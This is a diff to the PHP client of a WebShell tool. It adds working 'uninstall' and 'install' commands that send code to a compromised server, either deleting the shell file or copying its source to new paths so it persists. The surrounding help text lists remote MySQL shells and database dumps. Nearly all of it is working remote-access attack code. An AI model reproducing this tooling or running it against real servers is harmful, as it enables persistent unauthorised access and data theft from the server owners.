@@ -124,7 +124,7 @@ class Client
                 "* sublime [file path] : Edit remote file with sublime text editor on the local",
                 "      system.",
                 "* uninstall           : Uninstall the current WebShell on the server.",
-                "* install [file path] : Install the WebShell on the specific remote parh.",
+                "  install [file path] : Install the WebShell on the specific remote parh.",
                 "* mysql [host] [port] [user] [password] : Start an interative MySQL shell",
                 "      connection on the remote server.",
                 "* mysqldump [host] [port] [user] [password] [local file] : Make a dump from",
@@ -192,14 +192,106 @@ class Client
         }
         else if(in_array($command, array('uninstall')))
         {
-            // TODO: Under construction.
-            echo "! Under construction.\n";
+           $result = $this->sendBuffer('
+                $filename = trim(preg_replace(\'/\\(.*$/\', "", __FILE__));
+                @unlink($filename);
+                $result = file_exists($filename) ? -1 : 1;
+            ');
+
+            if($echo)
+            {
+                if((int)$result === 1)
+                {
+                    echo "The WebShell server has been successfully removed!.\n";
+
+                    // Disconnect from server
+                    $this->callExec('exit', array(), true);
+                }
+                else if((int)$result === -1)
+                {
+                    echo "Unable to delete the file. Check your permissions and try again.\n";
+                }
+                else
+                {
+                    echo "Error 500: invalid status.\n";
+                }
+            }
+            return $result;
         }
         else if(in_array($command, array('install')))
         {
-            $filename = (count($argv) > 0) ? implode(' ', $argv) : '';
-            // TODO: Under construction.
-            echo "! Under construction.\n";
+            $filepath = (count($argv) > 0) ? implode(' ', $argv) : '';
+            
+            $result = $this->sendBuffer('
+                $filepath  = "'.$this->escapePHP($filepath).'";
+
+                function inst($filepath)
+                {
+                    // for __file__ from eval (php bug)
+                    @file_put_contents($filepath, file_get_contents(trim(preg_replace(\'/\\(.*$/\', "", __FILE__))));
+                    return file_exists($filepath);
+                }
+
+                function checkdir($directory)
+                {
+                    if(is_dir($directory))
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        @mkdir($directory, 0700, true);
+
+                        if(is_dir($directory))
+                        {
+                            return true;
+                        }
+                        else
+                        {
+                            return false;
+                        }
+                    }
+                }
+
+                if((strpos($filepath, "/") !== false) || (strpos($filepath, "\\\\") !== false))
+                {
+                    $directory = dirname($filepath);
+
+                    if(checkdir($directory))
+                    {
+                        $result = inst($filepath) ? 1 : -1;
+                    }
+                    else
+                    {
+                        $result = -2;
+                    }
+                }
+                else
+                {
+                    $result = inst($filepath) ? 1 : -1;
+                }
+            ');
+
+            if($echo)
+            {
+                if((int)$result === 1)
+                {
+                    echo "Installed a copy of server into path!.\n";
+                }
+                else if((int)$result === -1)
+                {
+                    echo "Unable write on specific directory. Check your permissions and try again.\n";
+                }
+                else if((int)$result === -2)
+                {
+                    echo "The directory of the copy does not exists and canot make this. Check your permissions and try again.\n";
+                }
+                else
+                {
+                    echo "Error 500: invalid status.\n";
+                }
+            }
+            return $result;
         }
         else if(in_array($command, array('force-shell', 'force-exec', 'force-system')))
         {
